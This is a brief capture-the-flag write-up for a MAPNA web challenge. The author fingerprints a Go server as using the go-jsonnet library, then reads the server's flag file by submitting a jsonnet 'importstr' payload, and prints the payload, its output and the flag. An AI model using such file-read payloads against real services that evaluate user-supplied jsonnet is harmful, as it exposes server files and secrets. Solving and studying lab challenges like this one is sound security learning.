Looking at the source code provided first we can see a redacted Go library
from github.

```go  
import (  
   "net/http"  
   "github.com/gin-gonic/gin"  
   "github.com/REDACTED/REDACTED"  
)  
```

I cause some errors on the server to try and identify the library:  
```  
Expected token OPERATOR but got "}"  
Expected a comma before next field  
```

Both these errors point towards the [go-jsonnet](https://github.com/google/go-
jsonnet) library, which meets the stars requirement in the challenge
description.

I end up looking for ways to read files in the issues section of the repo and
find [this issue](https://github.com/google/go-jsonnet/issues/337).

It mentions a payload like the following:

```json  
{  
   "wow so advanced!!": importstr "/flag.txt‚Äù  
}  
```

Running it in the parser we are given the flag:

```json  
{  
  "wow so advanced!!": "MAPNA{5uch-4-u53ful-f347ur3-a23f98d}\n\n"  
}  
```

Flag: `MAPNA{5uch-4-u53ful-f347ur3-a23f98d}`
